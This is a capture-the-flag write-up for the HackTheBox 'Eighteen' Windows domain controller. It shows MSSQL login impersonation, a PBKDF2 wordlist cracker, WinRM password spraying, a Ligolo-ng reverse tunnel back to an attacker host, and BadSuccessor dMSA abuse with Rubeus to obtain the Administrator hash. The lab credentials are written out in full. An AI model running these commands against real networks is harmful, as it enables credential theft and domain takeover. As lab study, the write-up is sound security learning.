---
title: Eighteen
date: 2025-12-29
description: Easy Windows Server 2025 DC box starting from MSSQL credentials — impersonating logins into a financial database, spraying a cracked Werkzeug hash for WinRM, and abusing BadSuccessor dMSA migration for domain admin.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```
kevin : iNa2we6haRj2gaw!
```

```bash
# Nmap 7.95 scan initiated Mon Dec 29 11:46:06 2025 as: /usr/lib/nmap/nmap -p80,1433,5985 -A -oN scan_results.txt 10.10.11.95
Nmap scan report for eighteen.htb (10.10.11.95)
Host is up (0.44s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome - eighteen.htb
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-12-29T23:49:08+00:00; +7h02m34s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-29T20:26:46
|_Not valid after:  2055-12-29T20:26:46
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h02m33s, deviation: 0s, median: 7h02m32s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   487.09 ms 10.10.14.1
2   487.28 ms eighteen.htb (10.10.11.95)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 29 11:46:34 2025 -- 1 IP address (1 host up) scanned in 28.05 seconds
```

MS-SQL:

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

usernames:

```txt
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

Mssql login:

```bash
impacket-mssqlclient
eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.10.11.95
```

User `kevin` doesn't have much privilege due to `server principals`:

```sql
> ?
```

```sql
> enum_impersonate
```

This command shows that `kevin` can **impersonate** as `appdev`:

```sql
> exec_as_login appdev
```

To switch user.

> Note : commands without semi colon are **impacket-inbuild** functions

```sql
> enum_db
> use financial_planner;
> select name from sys.tables;
> select * from dbo.users;
```

Got `pbkdf2` hash

# User Flag

```python
#!/usr/bin/env python3
import hashlib
import multiprocessing
import sys
import os

# --- Configuration ---
# Data taken from your previous request
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
WORDLIST_FILE = "/usr/share/wordlists/rockyou.txt"  # The name of your dictionary file

def check_password(args):
    """
    Worker function to check a single password.
    """
    password_bytes, salt, iterations, target_hash = args
    try:
        # Python's hashlib requires byte inputs for the password and salt
        computed = hashlib.pbkdf2_hmac(
            'sha256', 
            password_bytes, 
            salt.encode('utf-8'), 
            iterations
        )
        # Compare the computed hash with the target
        if computed.hex() == target_hash:
            return password_bytes.decode('utf-8', errors='ignore')
    except Exception:
        return None
    return None

def main():
    # 1. Check if the wordlist exists
    if not os.path.exists(WORDLIST_FILE):
        print(f"Error: Wordlist file '{WORDLIST_FILE}' not found.")
        print("Please download a wordlist (e.g., rockyou.txt) and place it in the same folder.")
        return

    print(f"[*] Starting crack with {multiprocessing.cpu_count()} CPU cores...")
    print(f"[*] Target Hash: {TARGET_HASH[:10]}...")
    print(f"[*] Iterations: {ITERATIONS}")
    
    # 2. Load passwords from file
    tasks = []
    print("[*] Loading wordlist...")
    try:
        with open(WORDLIST_FILE, 'rb') as f: # Read in binary mode to handle weird characters
            for line in f:
                password = line.strip()
                # Pack arguments to send to the worker function
                tasks.append((password, SALT, ITERATIONS, TARGET_HASH))
    except Exception as e:
        print(f"Error reading file: {e}")
        return

    print(f"[*] Loaded {len(tasks)} passwords. Cracking started...")

    # 3. Initialize Multiprocessing Pool
    pool = multiprocessing.Pool(multiprocessing.cpu_count())
    
    # Use imap_unordered to check results as they finish
    found = False
    for result in pool.imap_unordered(check_password, tasks, chunksize=100):
        if result:
            print(f"\n[+] SUCCESS! Password found: {result}")
            found = True
            pool.terminate() # Stop all other processes immediately
            break
            
    if not found:
        print("\n[-] Password not found in this wordlist.")
    else:
        pool.close()
        pool.join()

if __name__ == '__main__':
    main()
```

```
nxc winrm 10.10.11.95 -u users.txt -p iloveyou1
```

`adam.scott : iloveyou1`

```
evil-winrm -i 10.10.11.95 -u adam.scott -p iloveyou1
```

Gained **User flag**

# Root Flag

### SharpHound

https://github.com/SpecterOps/SharpHound/releases

Upload and execute SharpHound.exe

> Note : Because there no **LDAP service** on the target else we could have used **bloodhound-python** to collect

### Bloodhound

`adam.scott`
-> a member of IT group
-> no outbound object control

Doesn't have much of privilege

### BloodyAD

This tool can perform specific LDAP calls to a domain controller in order to perform AD priv esc.
https://github.com/CravateRouge/bloodyAD

> Here LDAP service is running internally on local

### Port Forwarding on Windows
#### Ligolo-ng
`version 0.7.5`
https://github.com/nicocha30/ligolo-ng

-> Download a proxy for attacker and agent for victim
-> Here the proxy acts as a listener and agent connects to the proxy from victim

```attacker
./proxy -selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
WARN[0000] Using self-signed certificates
WARN[0000] TLS Certificate fingerprint for ligolo is: 491A60EDA4E040E6EC4C4D8D9F64417CB4D1A0FB9EF3A355868D1D340B874977
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.7.5

ligolo-ng » 
```

```victim
./agent -connect <attacker-ip>:11601 -ignore-cert
```

agent connects back to the listener and a session will be created

select the session using `session` command then use ifconfig to look for the interface available on the victim which will be useful for routing the machines in internal network

```attacker
ligolo-ng » INFO[4773] Agent joined.   id=1c08fafa-fc2b-4894-af52-41b4b64bbdf4 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.243.211:59584"
ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.243.211:59584 - 1c08fafa-fc2b-4894-af52-41b4b64bbdf4
[Agent : EIGHTEEN\adam.scott@DC01] » ifconfig
┌─────────────────────────────────────────────────┐
│ Interface 0                                     │
├──────────────┬──────────────────────────────────┤
│ Name         │ Ethernet0 2                      │
│ Hardware MAC │ 00:50:56:95:a9:35                │
│ MTU          │ 1500                             │
│ Flags        │ up|broadcast|multicast|running   │
│ IPv6 Address │ dead:beef::c8be:5f9:33d4:c1f4/64 │
│ IPv6 Address │ fe80::1d8f:efd0:48c8:ce38/64     │
│ IPv4 Address │ 10.129.243.211/16                │
└──────────────┴──────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 1                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```

here we just need to perform local port forwarding

before tunneling create an interface on attacker_machine:

```
sudo ip tuntap add user <current_user> mode tun ligolo  

sudo ip link set ligolo up
```

set a route according to mentioned in the documentation:

```
sudo ip route add 240.0.0.1/32 dev ligolo 
```

now start the tunneling using ligolo:

```attacker
[Agent : EIGHTEEN\adam.scott@DC01] » s-tun ligolo
[Agent : EIGHTEEN\adam.scott@DC01] » INFO[5178] Starting tunnel to EIGHTEEN\adam.scott@DC01 (1c08fafa-fc2b-4894-af52-41b4b64bbdf4)
```

Now we can able to access internal ports using `240.0.0.1`

### Back to BloodyAD

```
bloodyAD --host 240.0.0.1 -d eighteen.htb -u 'adam.scott' -p 'iloveyou1' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=eighteen,DC=htb
permission: WRITE

distinguishedName: OU=Staff,DC=eighteen,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=adam.scott,OU=Staff,DC=eighteen,DC=htb
```

We have **CREATE_CHILD privilege over an OU** (Organizational Unit)

```
bloodyAD --host 240.0.0.1 -d eighteen.htb -u 'adam.scott' -p 'iloveyou1' get search --filter "(objectClass=computer)" --attr operatingSystem,operatingSystemVersion 
```

it reveals the operation system as **Windows Server 2025** (data center)

So this aligns to a specific vulnerability **Badsuccessor**

# Badsuccessor

https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory

Here we gonna abuse DMSA (Domain Managed Service Account) by creating a new DMSA account with special privilege which acts as a successor of the previous DMSA account (admin) to hijack the admin hash.

Reveals the OU, DC, and DC(TLD).

**Reference:**
https://calledstriker.gitbook.io/blog/security-research/badsuccessor#setup-1

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> New-ADComputer -Name "BADPC" -Path "OU=Staff,DC=eighteen,DC=HTB" -PassThru |
    Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString "Password123@" -AsPlainText -Force)
 
*Evil-WinRM* PS C:\Users\adam.scott\Documents> New-ADServiceAccount -Name badpcDMSA -DNSHostName badpcDMSA.eighteen.htb -CreateDelegatedServiceAccount -KerberosEncryptionType AES256 -PrincipalsAllowedToRetrieveManagedPassword "BADPC$" -Path "OU=Staff,DC=eighteen,DC=HTB" -Verbose
Verbose: Performing the operation "New" on target "CN=badpcDMSA,OU=Staff,DC=eighteen,DC=HTB".

*Evil-WinRM* PS C:\Users\adam.scott\Documents> $sid = (Get-ADUser -Identity "adam.scott").SID

*Evil-WinRM* PS C:\Users\adam.scott\Documents> $acl = Get-Acl "AD:\CN=badpcDMSA,OU=Staff,DC=eighteen,DC=HTB"

*Evil-WinRM* PS C:\Users\adam.scott\Documents> $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"

*Evil-WinRM* PS C:\Users\adam.scott\Documents> $acl.AddAccessRule($rule)

*Evil-WinRM* PS C:\Users\adam.scott\Documents> Set-Acl -Path "AD:\CN=badpcDMSA,OU=Staff,DC=eighteen,DC=HTB" -AclObject $acl -Verbose
Verbose: Performing the operation "Set" on target "AD:\CN=badpcDMSA,OU=Staff,DC=eighteen,DC=HTB".
Verbose: Performing the operation "Set" on target "CN=badpcDMSA,OU=Staff,DC=eighteen,DC=HTB".

*Evil-WinRM* PS C:\Users\adam.scott\Documents> Set-ADServiceAccount -Identity badpcDMSA -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=HTB'
    'msDS-DelegatedMSAState'            = 2
} -Verbose
Verbose: Performing the operation "Set" on target "CN=badpcDMSA,OU=Staff,DC=eighteen,DC=htb".
```

1. Create a fake computer account with a known password
2. Create a fake service account
3. Give your user GenericAll over the dMSA (badpcDMSA created alongside the computer)
4. Point the dMSA at your target account

## Rubeus
built using windows - `version 2.3.3`

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\Rubeus.exe hash /password:'Password123@' /user:BADPC$ /domain:eighteen.htb

*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\Rubeus.exe asktgt /user:BADPC$ /aes256:36275C2C7B09F9751071483039A0986185CF37EAF07C78836934FD7759C30354 /domain:eighteen.htb /outfile:badpc_tgt.kirbi

*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\Rubeus.exe asktgs /targetuser:badpcDMSA$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ticket:badpc_tgt.kirbi /outfile:dmsa_tgt.kirbi
```

generated Kerberos key material from a password, used it to get a TGT for **`BADPC$`**, and then leveraged that TGT to request a service ticket for **`badpcDMSA$`**. (add previous keys to the output)

Gained **Administrator** ntlm hash

Gained `root`
